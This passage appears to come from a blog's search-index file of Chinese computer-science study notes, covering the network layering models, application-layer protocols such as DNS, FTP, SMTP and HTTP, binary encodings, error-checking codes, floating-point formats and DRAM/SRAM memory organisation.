可以发送的数据越多注意这里隐含了传播时延的值 从发送发发送数据开始, 到发送方收到确认收到的确认所经历的时延 $$RTT包括\\begin{cases}往返传播时延=传播时延\\times 2\\\\末端处理时间\\end{cases}$$ 7. 利用率时延与利用率成正比关系 信道利用率$$信道利用率=\\frac{有数据通过的时间}{(有+无)数据通过的时间}$$ $$信道利用率=\\frac{一个发送周期内发送的比特数}{发送方数据传输率\\times 发送周期}$$ 注意发送周期包括传输时延和发送时延 $$信道吞吐率=信道利用率\\times 发送方的发送速率$$ 网络利用率$$网络利用率=信道利用率加权平均值$$ 分层结构 实体每一层操作的元素称为实体 对等实体同一层次的实体 协议为对等实体数据交换而建立的规则,标准或约定(水平的) 1. 语法: 规定传输数据的格式 2. 语义: 规定索要完成的功能 3. 同步: 规定各种操作的顺序 接口(访问服务点 SAP)上层使用下层服务的入口 仅在相邻层间有接口 服务下层为相邻上层提供的功能调用(垂直的) SDU 服务数据单元为完成用户所要求的功能而应传送的数据 PCI 协议控制信息控制协议操作的信息 PDU 协议数据单元对等层次之间传送的数据单位$$PCI+SDU=PDU$$ 分层的原则 各层之间相互独立, 每层只实现一种相对独立的功能 每层之间界面自然清晰, 易于理解, 相互交流尽可能少 结构可分割开, 每层采用最合适的技术实现 保持下层对上层的独立性, 上层单向使用下层提供的服务 整个分层结构能促进标准化工作 OSI 参考模型目的: 支持异构网络系统的互联互通上四层为端到端通信, 而下三层为点到点的通信 应用层所有能和用户交互产生网络流量的程序 表示层用于处理在两个通信系统中交换信息的表示方式(语义和语法) 功能 数据格式变换 数据加密解密 数据压缩和恢复 会话层向表示层实体/用户进程提供建立连接并在连接上有序的传输数据, 也称为建立同步 功能 建立,管理,终止会话 使用校验点是会话在通信失效时从校验点(同步点)继续恢复通信, 实现数据同步适合传输大文件 传输层复制主机两个进程的通信, 及端到端的通信.传输单位是报文段或用户数据报 功能 可靠传输, 不可靠传输 差错控制 流量控制 复用分用复用: 多个应用层进程可同时使用下面运输层的服务分用: 运输层把收到的信息分别交付给上面应用层中相应的进程 网络层把分组从源端传到目的端, 为分组交换网上的不同主机提供通信服务传输单位是数据报/分组 功能 路由选择选择最佳路径 流量控制 差错控制 拥塞控制 数据链路层把网络层传下的数据报组装成帧传输单位是帧 为网络层提供 无确认无连接服务 有确认无连接服务 有确认面向连接服务 功能 成帧定义帧的开始和结束 差错控制帧错+位错 流量控制 访问(接入)控制控制对信道的访问 物理层在物理媒体上实现比特率的透明传输传输单位是比特 功能 定义接口特性 定义传输模式单工, 半双工, 双工 定义传输速率 比特同步 比特编码 TCP/IP 参考模型 与 OSI 模型的相同点 都分层 基于独立的协议栈的概念 可以实现异构网络互联 与 OSI 模型的不同点 OSI 定义三点:服务, 协议, 接口 OSI 先出现, 参考模型先于协议发明, 不偏向特点协议而 TCP/IP 是现有协议后又参考模型 TCP/IP 考虑异构网互联问题, 将 IP 作为重要层次 两种模型的通信方式有区别 OSI TCP/IP 网络层 无连接+面向连接 无连接 传输层 面向连接 无连接+面向连接 5 层参考模型综合了 OSI 与 TCP/IP 的优点","link":"/network-network1/"},{"title":"计算机网络——应用层","text":"计算机网络——应用层 目录 网络应用模型 客户/服务器模型（Client/Server） 服务器 客户端 PP 模型（对等模型） 域名解析系统（DNS） 域名 域名服务器 递归查询 迭代查询 文件传送协议 FTP 工作原理 FTP 传输模式 电子邮件 内容 组成结构 SMTP（简单邮件传输协议） 通用因特网邮件扩充 MIME POP（邮局协议） 工作方式 IMAP（网际报文存取协议） 通信过程 基于万维网的电子邮件 万维网 HTTP（超文本传输协议） 具体过程 特点 HTTP 连接方式 HTTP 报文结构 应用层对应用程序的通信提供服务 应用层协议定义 应用进程交换的报文类型请求或响应 各种报文类型的语法如报文类型的语法如报文中各个字段及其详细描述 应用层功能 文件传输, 访问和管理 电子邮件 虚拟终端 查询服务和远程作业登录 应用层的重要协议 FTP SMTP, POP3 HTTP DNS 网络应用模型 客户/服务器模型(Client/Server) 常用于 Web,文件传输 FTP, 远程登录, 电子邮件 服务器提供计算服务的设备 特点 永久提供服务 永久性访问地址/域名 客户端请求计算服务的设备 特点 与服务器通信, 使用服务器提供的服务 间歇性接入网络 可能使用动态 IP 地址 不与其他客户机直接通信 P2P 模型(对等模型) 不存在永远在线的服务器 每个主机既可以提供服务, 也可以请求服务 任意端系统/节点之间可直接通信 节点间歇性接入网络 节点可能改变 IP 地址 可扩展性好 网络健壮性强 域名解析系统(DNS) 域名 根 顶级域名 国家顶级域名 通用顶级域名 基础结构域名/反向域名 二级域名 类别域名 行政区域名 三级域名 四级域名 域名服务器 域名服务器的层次结构只有上三层 根域名服务器知道所有顶级域名服务器的域名和 IP 地址 顶级域名服务器管理该顶级域名服务器注册的所有二级域名 权限域名服务器负责一个区的域名服务器 DNS 服务器时间的管辖范围 本地域名服务器 主机发出 DNS 查询请求时, 先发给本地域名服务器, 若查询失败则询问根域名服务器 递归查询 主机发出 DNS 查询请求时, 先发给本地域名服务器, 若查询失败则询问根域名服务器 根域名服务器中也没有记录, 则向下询问顶级域名服务器 顶级域名服务器中也没有记录, 则向下询问权限域名服务器 迭代查询 主机发出 DNS 查询请求时, 先发给本地域名服务器, 若查询失败则询问根域名服务器 根域名服务器中也没有记录, 则主机询问顶级域名服务器 顶级域名服务器中也没有记录, 则主机询问权限域名服务器 若 DNS 服务器中没有记录, 则会告诉主机取哪个 DNS 服务器查询 文件传送协议 FTP提供不同种类主机系统之间的文件传送能力FTP 使用 TCP 实现可靠传输 简单文件传送协议 TFTP FTP 基于客户/服务器协议 用户通过客户机程序连接至远程计算机上运行的服务器程序 依照 FTP 协议提供服务, 进行文件传送的计算机就是 FTP 服务器 连接 FTP 服务器, 遵循 FTP 协议与服务器传送文件的电脑就是 FTP 客户端 工作原理 登录ftp 地址和用户名密码或匿名登录 服务器进程1 个主进程, n 个从属进程 每个从属进程可处理单个客户请求 控制连接和数据连接控制连接(使用 21 号端口)在整个会话过程中都打开, 客户发送的请求都通过控制连接发送数据连接专门用来传送文件(服务器在收到客户端的数据请求时建立) 控制连接始终保持数据连接保持一段时间 数据连接端口 主动方式使用 TCP 20 端口服务器端主动告诉客户端数据连接端口为 20 被动方式由服务器和客户机自行协商决定(端口&gt;1024)客户端向服务器发送询问得到数据连接端口号 FTP 传输模式 文本模式ASCII 模式, 以文本序列传输数据 二进制模式Binary 模式. 以二进制序列传输数据 电子邮件 采用客户/服务器方式, 每台邮件服务器即可为客户, 也可为服务器 内容 信封收件人邮箱 内容 首部To(发送目标邮件地址), Subject(主题) 这两个需自行填写 From(发件人邮件地址), Date(日期) 这两个自动生成 主体内容 组成结构 用户代理电子邮件客户端软件 功能 撰写写邮件 显示看邮件 处理收发邮件等 通信发送邮件到邮件服务器从邮件服务器读取邮件 邮件服务器 功能 发送和接收邮件发送邮件到其他邮件服务器从其他邮件服务器接收邮件 向发件人报告邮件传输结果 协议 SMTP将邮件发出 POP3接收邮件使用的协议 发送方通过用户代理写好邮件, 并发送到邮件服务器 邮件服务器将邮件发送给接收端的邮件服务器 接收方从邮件服务器中读取邮件, 通过客户代理查看 SMTP(简单邮件传输协议) STMP 使用 TCP, 端口号 25, 客户/服务器模式 SMTP 规定了两个相互通信的 SMTP 进程之间如何交换信息 负责发送邮件的 SMTP 进程就是 SMTP 客户, 负责接收邮件的进程就是 SMTP 服务器 SMTP 规定 14 条命令和 21 种应答信息 缺点 不能传送可执行文件和其他二进制对象 仅限于传送 7 位的 ADCII 码, 不能传送其他非英语国家的文字 会拒绝超过一定长度的邮件 通用因特网邮件扩充 MIME将非 ASCII 码内容转换成 ASCII 码在发送 使电子邮件系统可有支持声音,图像和多种国家语言等 POP3(邮局协议) TCP 连接, 端口号 110, 客户/服务器模式 工作方式 下载并保留(在服务器)保留在服务器种 下载并删除从服务器中删除 IMAP(网际报文存取协议)用户 PC 上的 IMAP 客户程序打开 IMAP 服务器的邮箱时, 用户可以看到邮箱的首部用户需要打开某个邮件, 该邮件才上传到用户的计算机上可以让用户在不同地方使用不同计算机随时上网阅读处理邮件, 运行只读取邮件中的某一部分 通信过程 连接建立询问 SMTP 服务器是否有能力接收邮件, 有能力则建立连接 邮件发送 连接释放邮件发完后连接释放 基于万维网的电子邮件方便用户通过 HTTP 协议使用用户代理 万维网万维网使一个大规模的联机的信息存储所(资料空间), 使无数个网络站点和网页的集合 同一资源定位符 URL 不区分大小写 唯一标志资源 组成&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt; 万维网使用客户/服务器方式工作 万维网使用超文本标记语言 HTML HTTP(超文本传输协议)HTTP 定义浏览器如何向万维网服务器请求万维网文档以及服务器如何将文档传送给浏览器 具体过程 浏览器分析 URL 浏览器向 DNS 请求解析 IP 地址 DNS 解析出 IP 地址 浏览器与服务器建立 TCP 连接 浏览器发出取文件命令 服务器响应 释放 TCP 连接 浏览器显示 特点 HTTP 协议是无状态的无记忆 采用 TCP 作为运输层协议,单 HTTP 协议本身是无连接的通信双方交换 HTTP 报文之前不需要先建立 HTTP 连接 HTTP 连接方式 持久连接服务器响应后依然保持连接, 之后请求都通过该连接来请求 非流水线相当于发送完请求后, 要等待响应才能发送下一个请求 流水线可以连续发送请求 非持久连接服务器响应后, 释放连接, 发送新请求时要重新建立连接时间消耗较长 HTTP 报文结构HTTP 报文时面向文本的, 每个字段都是 ASCII 串分为请求报文和响应报文 首部字段说明浏览器,服务器和报文主题的一些信息","link":"/network-network7/"},{"title":"计算机组成原理——数据的表示和运算","text":"计算机组成原理——数据的表示和运算 目录 基础知识 BCD 码 码 余三码 码 字符与字符串 校验码（重要） 基础概念 奇偶校验码 海明码 CRC 码（循环冗余校验码） 定点数 定点小数 定点整数 无符号数 有符号数的编码 原码 反码 补码 移码 定点数的运算 移位运算 算术移位 逻辑移位 循环移位 定点数加减运算 乘法运算 除法运算 符号扩展（数据位数增长） 强制转换 浮点数 浮点数的组成 IEEE 标准 浮点数的运算 边界对齐 重点概括 原码、反码、补码的表示范围 ALU 主要功能 加法器 一位全加器 串行加法器 串行进位的并行加法器 基础知识 基数每个数码位所用的不同符号的个数,r 进制的基数为 r 转换 整数部分 小数部分 BCD 码4bit表示一个十进制的字符 8421 码 属于有权码, $4$ 个比特对应 8421如$0001_2=1_{10}$, $1000_2=8_{10}$ , $1001_2=9_{10}$ 加法运算 方法 1转换成 $10$ 进制数后相加,得到的结果在转换为 BCD 码 方法 2:二进制相加,得到的结果如果大于 $10_{10}(1010_{2}-1111_{2})$ ,则结果加 $6$ 修正,高位没 4 位则在左边补 0如 $0101_{2}+1000_{2}=1101_{2}=13_{10}$,结果大于 $10_{10}(1010_{2}-1111_{2})$,结果加 $6$, 即$1101_{2}+0110_{2}=10011_2$, 结果小于 8 位,补三个 0 得到 0001,0011 每四位转换成$10$进制 ($0001_2=1_{10}$, $0011_2=3_{10}$) 结果为 $13$ 余三码在 8421 码的基础上每个数加上($0011_2$) 如:用余三码表示$1_{10}$, 8421 码对应的$1_{10}$为$0001_2$,加上$0011_2$,结果为$0100_2$ 属于无权码(对应的每个 2 进制位没有对应的 10 进制) 2421 码 4 个二进制位分别对应 2421 所表示十进制数0-4 的二进制首位位 0所表示十进制数5-9 的二进制首位位 1 属于有权码, $4$ 个比特对应 2421 字符与字符串 ASCII 码 汉字 区位码 国标码 机内码 校验码(重要) 基础概念 码字由若干位代码组成的一个字 码字间的距离两个码字逐位对比,具有不同位的个数 码距各合法码字间的最小距离 $码距=1$ 时,无检错能力$码距=2$ 时,有检错能力$码距 \\geq 3$ 时,可以有检错和纠错能力(如海明码) 奇偶校验码 奇校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为奇数 偶校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为偶数 如果接收到的数据中,1 的个数不为奇数(偶数),则可以判断出错. 如果出现偶数个错误,则奇偶校验码检验不出错误 偶校验的实现各信息进行异或,得到的数字添加在最高位 偶校验的检验对收到的信息每个为进行异或,得到的结果为 0,则可能没错(可能有 2 位出错), 若为 1 则一定出错 海明码 基于偶校验的扩展,拥有多个校验位,能够自动检测出 1 位出错,并纠错但是对于 2 位以上的出错只能检验出错误(使用全校验码的前提下) 海明码校验位的位置 信息位有 $n$ 位, 校验位有 $k$ 位, 共 $n+k$ 位,对应 $2^k$ 种状态($2^k \\geq n+k+1$) 每个校验位放在 $2^{i-1}$ 上(如 P1,P2,P3),然后将信息位依次从低到高进行填充(如 $D_1,D_2,D_3,D_4$) 检测 d 位错, 码距为 d+1纠错 d 位, 码距为 2d+1 校验位的计算 其中数据位$D_i$对应的$H_j$, 求j的二进制,如$D_3$存放在$H_6$中 $6_{10}=0110_2$, 对应的二进制中,第二位和第三位为1,因此该数据位需要由$P_2,P_3$ 来检验, 以此类推,得出 $$D_1,D_2,D_4需要由P_1检验\\\\ D_1,D_3,D_4需要由P_1检验\\\\ D_2,D_3,D_4需要由P_1检验 P_i=所有需要通过P_i检验的数据位的值一起异或 $$ 即可得到海明码 纠错(仅限 1bit 出错)$S_1=P_1$ 异或属于 $P_1$ 分组的数据$S_2=P_2$ 异或属于 $P_2$ 分组的数据$S_3=P_3$ 异或属于 $P_3$ 分组的数据如果 $S_1$ $S_2$ $S_3$ 都为 0 则没有出错如果不为 0则 $S_3, S_2, S_1$ 组成的二进制数所指的位数出错如 $S_1=0, S2 =1, S3=0$, 则 $010_2=2_{10}$,第二位出错 全校验码通常会在头部在加一个校验位,计算所有校验位的偶校验码 CRC 码(循环冗余校验码) 原理双方约定一个除数,$K个信息位+R个校验位$作为被除数,添加校验位后需保证除法的余数为 $0$ $$生成多项式=除数\\\\ 校验位的长度 R=生成多项式的最高次幂\\\\ CRC 码位数=K+R=N=信息码\\\\ 若满足: 2^R \\geq K+R+1 则可以检验并纠正 1 个 bit 错误$$ 计算 校验位 R 信息码左移 R 位,地位补 0(右边添加 R 个 0) 用生成多项式进行模 2 除法,产生余数(R 位) 检验方使用信息吗除以约定好的除数,结果为 0 则没有出错;若不为 0,则得到的结果出错 模 2 除: 被除数的最高位为 1,则商 1,然后减除数;除数的最高位为 0,则商 0 然后减 0; 其余位进行模 2 减 模 2 减相当于异或操作 定点数 定点小数定点小数是纯小数, 小数点在符号位之后,有效数值最高位之前若 $X=x_0x_1x_2x_3\\dots x_n$, 则$x_0$为符号位, $x_1x_2x_3\\dots x_n$为数值有效部分,也称为尾数 定点整数定点整数是存整数, 小数点在有效数值最低位之后若 $X=x_0x_1x_2x_3\\dots x_n$, 则$x_0$为符号位, $x_1x_2x_3\\dots x_n$为数值有效部分,也称为尾数 无符号数 全部二进制位均表示数值位, 没有符号位 会求表示范围 无符号数无小数部分 设字长 $n$ 位,则表示范围位 $0至2^n-1$ 有符号数的编码 原码 原码表示数 用尾数表示真值的绝对值, 符号位0,1对应正,负 符号位都在最高位 小数点左边的为整数部分,右边为小数部分 定点小数 小数点在最前方(隐含) 设字长位 $n+1$ 位,则$$表示范围=-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$$ 有 +0 与-0 的区分 定点整数 小数点在最后方(隐含)设机器字长为 $n+1$ 位,则$$表示范围=-(2^n - 1)\\leq x\\leq 2^n - 1$$ 注意: 0有+0和-0 反码 反码表示数 若符号位为0, 则反码与原码相同若符号位为1, 则反码是原码的数值为全部取反 定点整数与定点小数的表示范围与原码的表示范围相同 补码 补码表示数 若符号位为0, 则补码与原码相同若符号位为1, 则 $补码=反码+1$(要考虑进位) 负数补码的巧妙方法(0 不能用这种方法)看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如10101010100的补码为11010101100补码转原码:看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如11010101100的原码为10101010100 若字长为 $n+1$ ,则定点整数范围: $-2^n\\leq x\\leq 2^{n-1}$; 注: 补码中 $0.0000_2=0_{10},1.0000_2=-1$, 即比原码中多-1定点小数范围: $-1\\leq x\\leq 1-2^{-n}$ 注: 补码中 $0.0000_2=0_{10},10000_2=-2^n$, 即比原码中多$-2^n$ 作用: 将减法操作转变为加法操作 补码表示的负定点小数有$[Y]补=2+[Y]{真值}$ 移码 移码表示数 移码=真值+偏置值 补码的基础上将符号位取反,只能表示整数 方便比较大小 当偏置值=128 时, 表示范围与补码的表示范围一致 定点数的运算 移位运算 算术移位操作对象为有符号数,符号位不动,数值位移到 原码 右移: 高位补0, 低位舍弃,若 $舍弃的位=0$ ,相当于除 $2$ ,若舍弃的位不为 $0$ ,则会丢失精度 左移: 低位补0, 高位舍弃,若 $舍弃的位=0$ ,相当于乘 $2$ ,若舍弃的位不为 $0$,则会丢失精度 反码正数与原码操作相同操作负数时: 右移: 高位补1,低位舍弃 左移: 低位补1, 高位舍弃 补码正数与原码操作相同负数 左移补0 右移补1 移码左移右移都是补 0 逻辑移位将操作对象看为无符号数左移时高位丢弃, 低位补 0右移时低位丢弃, 高位补 0 循环移位 定点数加减运算 原码 加法规则先判断符号位若相同, 则为绝对值之和, 符号位不变若不同, 则做减法, 绝对值大的减去绝对值小的, 符号位等于绝对值大的数的符号位 减法规则将减数符号位取反, 然后按照加法规则运算 补码 在补码的加减运算中, 符号位也参与运算, 符号位产生的进位丢弃 $[A+B]补 = [A]补 + [B]补$ $[A-B]补 = [A]补 + [-B]补$ 加减及溢出判断只有正数相加才会有上溢, 只有负数相加才会有下溢 方法 1:设$[A+B]_补=[S]_补$A 的符号位为 aB 的符号位为 bS 的符号位为 s$V = a\\bar{b}\\bar{s}+\\bar{a}\\bar{b}s$若 $V=1$,表示有溢出若 $V=0$,表示无溢出 方法 2:采用符号位的进位 C 和最高数值进位 S若 $C=0,S=1$,则出现上溢若 $C=1,S=0$,则出现下溢 方法 3(双符号位补码)(模 4 补码)(运算时会复制一个符号位)采用双符号位,若两个符号位的数值不一致,则有溢出 00 表示结果为正数 01 表示结果正溢 10 表示结果负溢 11 表示结果为负数例如: $A=00001111_2 B=11101000_2$在进行加法运算时$A=000001111_2 B=111101000_2$相加后 $C=111110111_2$ ,两个符号位一致,则结果无溢出, $C=11110111_2$ 乘法运算使用双符号位 原码一位乘法$[x]_原 * [y]_原$, 字长为 n+1 位, 高位为符号位 符号位不参与运算, 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 进行 n 轮加法,加完一轮后,逻辑右移(符号位也参与移动),高位补 0,当前计算结果的最低位,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ 的最低为变为辅助位(MQ 初始数值为乘数) $MQ最低位=1$ 时,加 $|x|_原$$MQ最低位=0$ 时,加 0 补码一位乘法$[x]_补*[y]_补$ 字长为 n+1 位, 高位为符号位 进行 n 轮加法,做完一轮加法时,算数右移(符号位不动)及高位补符号位,最后在进行一次加法,当前计算结果的最低为,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ的最低为变为辅助位 $辅助位-MQ最低为位=1$,加 $[x]_补$$辅助位-MQ最低位=0$,加 0$辅助位-MQ最低位=-1$,加 $[-x]_补$符号位参与运算 除法运算 $[x]_原 \\div [y]_原$在定点小数的除法中,被除数要小于除数 补码除法运算(加减交替法) 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 一共 $n = 机器字长-符号位长$ 次运算, 每次加除数的绝对值的负数的补码,如果结果为负数,则将本次的商改为 0,并且将余数恢复为减法之前(加回除数) 每一次操作后,进行一次逻辑左移,低位补 0 (最后一次上商余数补左移)(一共左移 n 次,上商 n+1 次) 原码除法运算(不恢复余数法) 符号位也参与运算 一共 $n = 机器字长-符号位长$ 次运算, 余数为负, 则余数左移一位后加 $|除数|$余数为正, 则余数左移一位后减 $|除数|$ 最后一步, 若余数为负,则商 0,并加上 $|除数|$ 得到正确的余数 余数的正负性与商相同 符号扩展(数据位数增长) 定点整数 正数高位都补0, 负数原码补0, 反码补码补1 定点小数 正数地位都补0, 负数反码补1, 原码补码补0 强制转换C 语言中整型都是用补码表示 长度相同的有符号数转换成无符号数,符号位不变,将符号位添加位权(即符号位变成一个数) 长整型变短整型, 高位被截断, 只保留低位 短整型变长整型, 相当于做符号扩展 浮点数 浮点数的组成 由 阶码和尾数组成 阶码: 用补码或移码表示的定点整数,其位数表示数的范围及小数点的位置(真值即为 E) 尾数: 用原码或补码表示的定点小数,其位数反应浮点数的精度(真值即为 M) 尾数的规格化(左规): 最高位不能是 0(注意是数符后面的那位) 尾数的规格化(右规): 尾数溢出时(双符号位为 01 或 10 )时,将尾数右移一位,阶码加 1 原码表示的规格化尾数能表示的范围为$正数 \\frac{1}{2} \\leq M \\leq 1-2^{-n}$$负数: -(1-2^{-n}) \\leq M \\leq - \\frac{1}{2}$ 补码表示的规格化尾数能表示的范围为$正数: \\frac{1}{2} \\leq M \\leq 1-2^{-n}$$负数: -1 \\leq M \\leq -(\\frac{1}{2} + 2^{-n})$规格化补码表示尾数时,符号位必须与最高数值位相反:如$0,101010_2$(正数), $1,0101010_2$(负数) 阶符,数符: 表示阶码和尾数的符号$真值 N = r^E + M (r为底数,通常为2)$ IEEE 754 标准 尾数部分默认表示 1.M(注意这个 1 是数值,而不是符号位)(隐含最高位) 原码规格化后 正数为: 0.1xxx, 负数为 1.1xxx补码规格化后 正数为: 0.1xxx, 负数为 1.0xxx 阶码真值 = 移码 - 偏移量 当阶码 E 全为0,尾数不全为0时, 表示非规格化小数, $\\pm(0.xxx)_2\\times 2^{-126}$ , 此时隐含最高位变为 0,阶码真值固定视为-126当阶码 E 全为0,尾数全为0时表示真值 $\\pm 0$当阶码 E 全为1,尾数全为0时,表示无穷大 $\\pm \\infty$当阶码 E 全为1,尾数不全为0时,表示非数值 NaN (如$\\frac{0}{0}, \\infty \\pm \\infty$ 等非法运算的结果就是 NaN) 各种浮点数的格式要记住 类型 数符 阶码位数 尾数数值位数 总位数 偏置值 float 短浮点数 1 8 23 32 7FH(127) double 长浮点型 1 11 52 64 3FFH(1023) long double 临时浮点数 1 15 64 80 3FFFH(16383) 浮点数的运算 加减运算步骤: 对阶,尾数加减, 规格化, 舍入, 判断溢出 对阶低阶转换成高阶,使两个数同阶 尾数加减因为以及化成了同阶,直接对尾数进行加减 规格化尾数加减后,出现 0.0xxx 的情况下,进行左规. 如果出现99.31等类型的情况,需要右规, 尾数算数右移一位,阶码加 1,直到$尾数 \\leq 1$ 舍入舍弃低位的尾数, 根据不同的舍入规则进行计算 判断溢出看阶码的位数是否超出所能表示的最大范围,若超出则溢出尾数溢出不一定会导致整体溢出 边界对齐边界对齐方式存储数据时,数据的大小都是 $(半字大小)\\times 2k$如 12345struct{ int a; //4字节(32位) char b; //1字节(8位) short c; ..2字节(16位)}record 若按边界对齐的方式存储该结构体,则如下表 1 2 3 4 a 的第一个字节 a 的第二个字节 a 的第三个字节 a 的第四个字节 b 空 c 的第一个字节 c 的第二个字节 若按边界不对齐的方式存储该结构体,则如下表 1 2 3 4 a 的第一个字节 a 的第二个字节 a 的第三个字节 a 的第四个字节 b c 的第一个字节 c 的第二个字节 空 C 语言中的数据在 C 语言的数据在内存中为补码形式 重点概括 原码、反码、补码的表示范围 字长为 $n+1$ 编码形式 定点小数(纯小数) 定点整数(纯整数) 原码 $-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ $-(2^n-1) \\leq x \\leq 2^n-1$ 反码 $-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ $-(2^n-1) \\leq x \\leq 2^n-1$ 补码 $-1\\leq x \\leq 1-2^{-n}$ $-2^n\\leq x \\leq 2^n-1$ ALU 主要功能 算术运算: 加 减 乘 除 等 逻辑运算: 与 或 非 异或等 辅助功能: 移位 求补等 加法器 一位全加器$A_i,B_i为两个输入,表示当前要加的数值, C_{i-1}表示进位,C_i表示本位进位 S_i表示输出$ $S_i = A_i \\bigoplus B_i \\bigoplus C_{i-1}$ &gt;$C_i = A_iB_i + (A_i \\bigoplus B_i)C_{i-1}$ 串行加法器只有一个全加器,数据逐位串行送入加法器中运算,进位存放在进位触发器中. 串行进位的并行加法器 把 n 个一位全加器串接起来 优化(并行进位的并行加法器) 如图,展开到 $C_0$ 后, 即可提前计算出每一位的进位","link":"/COP-COP-2/"},{"title":"计算机组成原理——存储系统","text":"计算机组成原理——存储系统 目录 基本概念 性能指标 RAM（随机存取）芯片 DRAM 与 SRAM DRAM 与 SRAM 的区别 DRAM 刷新 DRAM 的地址线复用技术 ROM 芯片 存储芯片与 CPU 的连接 位扩展 字扩展 双端口 RAM 多模块存储器 单体多字存储器 多体并行存储器 高位交叉编制 低位交叉编制 Cache 工作原理 性能指标（常考） Cache 与主存的映射方式 全相联映射（随意放） 直接映射 组相联映射 Cache 替换算法 随机算法（RAND） 先进先出算法（FIFO） 近期最少使用（LRU）（最常考） 近期不经常使用（LFU） Cache 写策略 写回法 全写法 写分配法 非写分配法 页式存储器 基本概念 辅存的数据要读入主存才能被 CPU 访问 cache: 放置频繁被访问的数据,加快 CPU 读/写数据的速度(缓解 CPU 与主存之间的速度矛盾) 主存-辅存层由硬件+操作系统完成解决了主存容量不够的问题 cache-主存层由硬件自动完成解决主存与 CPU 速度不匹配的问题 硬盘输入直接存取存储器, CPU 不能之间访问硬盘 性能指标 $存储容量 = 存储字数 \\times 字长$, MDR 位数反应存储字长 $单位成本(每位价格)=总成本 \\div 总容量$ $\\spadesuit 存储速度 (数据传输率) = 数据的宽度 \\div 存储周期$ $存取周期T_m=存取时间T_a+恢复时间$ 存取时间是从启动一次存储器操作到完成该操作所需时间,分为读出时间和写入时间 存取周期指存储器进行一次完整的读写操作所需的全部时间,即连续两次独立地访问存储器操作之间所需最小的时间间隔 主存带宽($B_m$)表示从主存进出信息的最大数量单位通常为 字/秒, 字节/秒, 位/秒(b/s) 提高带宽的方法 采用高速 DRAM 芯片 采用多体交叉存储结构 刷新存储器与其连接的硬件的内部总线宽度加倍 采用双端口存储器分离不同端口 存储容量一般指主存容量 RAM(随机存取) 芯片 会考求芯片的引脚数一般的输入有地址线, 数据线, 读写线, 片选线等(供电引脚, 接地引脚), 根据存储容量,判断出地址线和数据线需要有多少位($地址线数量=log_2(\\frac{总热量}{每个单元的大小}), 数据线=每个单元的大小$)注意,通常情况下 DRAM 使用了地址复用技术, 则地址线减半, 增加行通选和列通选(2 根线),如果要使用最少的线, 则片选线可以使用行通选代替 MDR数据总线, 宽度=存储字长 作用: 存放由内存中读出或写入内存的信息 MAR地址总线 若主存地址空间大小为$N$(B),则$MAR的位数=log_2(N)$ 作用: 用来存放当前 CPU 访问的内存单元地址, 或存放 CPU 写入内存的内存单元地址 存储元存储一个二进制位 存储单元多个存储元组成的部件(个数一般为存储字长的 bit 位数) 存储体由多个存储单元构成 译码器将输入地址转化为输出线输出的高电平信号,每一个输出线对应一个存储单元 控制电路控制译码器和 MDR 片选线, 芯片选择信号(低电平时启用)($\\overline{CS} 或 \\overline{CE} $) 读($\\overline{WE}$)\\写($\\overline{OE}$)控制线当只有一根读\\写控制线时,$\\overline{WE}$ 表示低电平写, $WE$ 表示高电平读当有两根读\\写线时,$\\overline{WE}$ 表示低电平允许写, $\\overline{OE}$ 表示低电平允许读 常见的描述方法$ 8\\times 8$, 第一个8表示有多少个存储单元,第二个表示存储字长 如: $8K \\times 8$, 表示$2^{13} \\times 8 bit$且一共有$log_2(8K)$个地址 DRAM 与 SRAM 常考考点 两者的比较 2. DRAM 的刷新 3. DRAM 的地址线复用技术 DRAM 与 SRAM 的区别 类型 SRAM(静态 RAM) DRAM(动态 RAM) 作用 常用于 Cache 常用于主存 存储方式 双稳态触发器存储信息 栅极电容存储信息 破坏性读出 否 是 读出后需要重写 否 是 运行速度 快 慢 集成度 低 高 发热量 高 低 存储成本 高 低 特性 断电后信息消失 断线后信息消失 需要”刷新” 不需要 需要 送行列地址 同时 分两次(地址线复用技术) DRAM 刷新“刷新”: 因为电容里的电荷只能存在2ms, 因此2ms之内,必须给电容充电 刷新周期: 2ms 每次刷新一行存储单元(存储器的行列地址的一行) 行列地址:存储单元像数组一样排列,分别使用行地址译码器和列地址译码器,将地址的前 $\\frac{n}{2}$ 位看作行地址,后 $\\frac{n}{2}$ 位看作列地址 硬件刷新, 读出一行信息后重新写入, 占用 1 个读/写周期 刷新方法(常考) 注: 刷新周期一般为 2ms, 若题目给出,则以题目为主例: 设 DRAM 排列结构位$128\\times128$, 读写周期为0.5us, 2ms共 $\\frac{2ms}{0.5us}=4000个周期$ 方法一: 分散刷新每次读写完刷新一行(导致存取周期翻倍,周期变为1us)前 0.5us 用来正常读写, 后0.5us用来刷新某行, 2ms内,刷新2000次,对于 $128\\times128$ 的结构来说,足够 方法二: 集中刷新2ms内集中安排刷新方式,系统的存取周期还是0.5us在这段时间内无法访问存储器,称为访存”死区”对于 $128\\times128$ 的结构来说, 在最后的128(行数)个周期(64us)内集中刷新 方法三: 异步刷新2us内需要产生128次刷新请求即 每过 $\\frac{2ms}{128} = 15.6us$, 刷新一次, 每15.6us内有0.5us的”死时间” 对于排列成$N\\times N$的存储芯片, 存取周期为 a需要在 2ms 内将$N$行都刷新 使用分散刷新 系统的存取周期为$2a$ 使用集中刷新 2ms 内集中刷新$N$行, 死亡时间为$aN$ms 使用异步刷新(分散刷新和集中刷新结合) $刷新周期=\\lfloor \\frac{2ms}{N} \\rfloor$ DRAM 的地址线复用技术 注意: 在求引脚数时, 要注意DRAM采用了地址线复用技术,即地址线数量减半 将行地址与列地址分两次传输先将行地址存放到行地址缓冲器,再将列地址传送到列地址缓冲器,之后在送给行地址与列地址译码器 ROM 芯片 MROM 掩模式制度存储器在芯片生成过程中直接写入信息, 之后不可重写, 只能读出可靠性高, 灵活性差, 生产周期长, 只适合定制 PROM 可编程只读存储器用专门的 PROM 写入器写入信息, 写一次后不可更改 EPROM 